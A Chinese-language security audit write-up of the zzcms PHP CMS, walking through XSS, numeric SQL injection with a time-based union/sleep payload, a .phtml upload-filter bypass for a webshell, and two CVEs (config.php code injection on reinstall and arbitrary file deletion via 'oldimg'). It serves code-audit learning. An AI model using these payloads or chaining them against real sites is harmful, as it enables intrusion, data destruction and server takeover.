这里有多处xss  
随便找一个
    ">
回溯keyword 17行
    $keyword=isset($_REQUEST["keyword"])?$_REQUEST["keyword"]:'';
输出参数没有经过转义  
post
    keyword=">
ad_save.php 发布功能
这里有一个插入行的注入 36行
    if ($_REQUEST["action"]=="add"){
    query("INSERT INTO zzcms_ad (bigclassname,smallclassname,title,titlecolor,link,img,imgwidth,imgheight,username,starttime,endtime,elite,sendtime)VALUES('$bigclassname','$smallclassname','$title','$titlecolor','$link','$img','$imgwidth','$imgheight','$username','$starttime','$endtime','$elite','".date('Y-m-d H:i:s',time()-(showadvdate+1)*60*60*24)."')");
回溯$bigclassname $smallclassname 28行
    $bigclassname=$_POST["bigclassid"];
    $smallclassname=$_POST["smallclassid"];
在测试的时候发现单引号被转义，
在下面找到一个貌似可以xss的地方  
78行这里 会把参数输出
    &s=&page=">返回
试了<>之后 发现也被转义了
找了好长时间，最好在inc/conn.php中找到
    if($_REQUEST){
        $_POST =zc_check($_POST);
        $_GET =zc_check($_GET);
        $_COOKIE =zc_check($_COOKIE);
        @extract($_POST);
        @extract($_GET);    
    }
跟进zc_check函数
    function zc_check($string){
        if(!is_array($string)){
            if(get_magic_quotes_gpc()){
            return htmlspecialchars(trim($string));
            }else{
            return addslashes(htmlspecialchars(trim($string)));
            }
         }
        foreach($string as $k => $v) $string[$k] = zc_check($v);
        return $string;
    }
这里转义了post get cookie中的变量
根据之前审bluecms的教训，转义了单引号也没事，找到没有被单引号包住的参数，也能注入  
最常用的数字型注入参数 就是id 直接全局搜一下id 碰碰运气  
找到了好几个没有被引号包住的
## sql注入
    admin\dl_sendsms.php 35行
       33: $sql="select * from zzcms_dl where saver<>'' and id in (". $id .")";//Ã»ÓÐ½ÓÊÕÈËµÄ£¬·ÇÁôÑÔÀà´úÀí²»ÓÃ·¢ÌáÊ¾ÓÊ¼þ¡£
       34  }else{
       35: $sql="select * from zzcms_dl where saver<>'' and id=".$id."";
    admin\showbad.php 30行
       30:   if (strpos($id,",")>0){
       31:      $sql="delete from zzcms_bad where id in (". $id .")";
    39行
       39  if ($action=="lockip"){
       40:   if (strpos($id,",")>0){
       41:      $sql="update  zzcms_bad set lockip=1 where id in (". $id .")";
    admin\userdel.php 30行
       30: if (strpos($id,",")>0){
       31: $sql="select id,username from zzcms_user where id in (". $id .")";
    admin\usernotreg.php 32行
       32:   if (strpos($id,",")>0){
       33:      $sql="delete from zzcms_usernoreg where id in (". $id .")";
以admin/dl_sendmail.php为例  
payload
    id[]=1) union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,sleep(5)%23
这里只演示一下漏洞存在 服务端会停顿一下在返回  
因为延时盲注，必须要保证表中有数据
## XSS
还有一处文件上传的地方  
uploadimg_form.php  
意外的小惊喜 发现了一处xss 67行
    " />
这个文件没有包含 config.php配置文件 也就是说，他的没有被转义
测试
## 文件上传
上传文件的流程  
uploadimg_from.php ==> uploadimg.php  
uploadimg.php中 有一些限制 12行  
content-type的限制 很容易绕过
    private $uptypes = array ('image/jpg','image/jpeg','image/pjpeg','image/gif','image/png','image/x-png','image/bmp','application/x-shockwave-flash');
    //只要不设定这种类型,php类的文件就无法上传'application/octet-stream'
还有一处对后缀的判断
    if (strpos($hzm,"php")!==false || strpos($hzm,"asp")!==false ||strpos($hzm,"jsp")!==false){
    echo "";exit;
    }
phtml就可以绕过
这样就上传拿shell了
去找了两个危害较大并且能够互相利用的CVE 分析了一下
## RCE
CVE-2018-8966  
这个漏洞需要和下面的任意文件删除相配合，因为该漏洞需要利用install.php重新安装 而zzcms安装完毕后，会生成一个锁文件install.lock
利用过程和bluecms的RCE有点相似  
重新安装zzcms
在网站访问地址这里写上  
1');phpinfo();#
分析一下  
install/index.php 105行
    $fp="../inc/config.php";
            $f = fopen($fp,'r');
            $str = fread($f,filesize($fp));
            fclose($f);
            $str=str_replace("define('sqlhost','".sqlhost."')","define('sqlhost','$db_host')",$str) ;
            $str=str_replace("define('sqlport','".sqlport."')","define('sqlport','$db_port')",$str) ;
            $str=str_replace("define('sqldb','".sqldb."')","define('sqldb','$db_name')",$str) ;
            $str=str_replace("define('sqluser','".sqluser."')","define('sqluser','$db_user')",$str) ;
            $str=str_replace("define('sqlpwd','".sqlpwd."')","define('sqlpwd','$db_pass')",$str) ;
        $str=str_replace("define('siteurl','".siteurl."')","define('siteurl','$url')",$str) ;
        $str=str_replace("define('logourl','".logourl."')","define('logourl','$url/image/logo.png')",$str) ;
        $f=fopen($fp,"w+");//fopen()的其它开关请参看相关函数
        fputs($f,$str);//把替换后的内容写入文件
        fclose($f);
这里会把配置信息写入到 inc/config.php中 重点看10 11行这里 把网站地址写入到配置文件中  
闭合单引号 写入代码 截断后边
    1' );phpinfo();#
看下写入之后的config.php
    define('siteurl','1');phpinfo();#') ;//网站地址
    define('logourl','1');phpinfo();#/image/logo.png') ;//Logo地址
在访问一下 inc/config.php
当然这里也可以把代码换成xss
## 任意文件删除
CVE-2018-8965  
代码在/user/ppsave.php的61行
看第一处删除文件unlink
    if ($oldimg<>$img && $oldimg<>"image/nopic.gif") {
        //deloldimg
            $f=$oldimg;
            if (file_exists($f)){
            unlink($f);     
            }
回溯$oldimg变量  
65行
    $oldimg=trim($_POST["oldimg"]);
等于没处理，下一步的if判断也很好满足 不等于就行
    if ($oldimg<>$img && $oldimg<>"image/nopic.gif")
### 测试
这两个漏洞加起来 RCE的漏洞还算是有点作用，要不然太鸡肋了
## 总结
这次的审计 主要是去找网站的功能，找到相应的功能后，再去找对应的代码，然后回溯变量  
这种在代码量比较大的情况下，还算是好用，不过会落下一些漏洞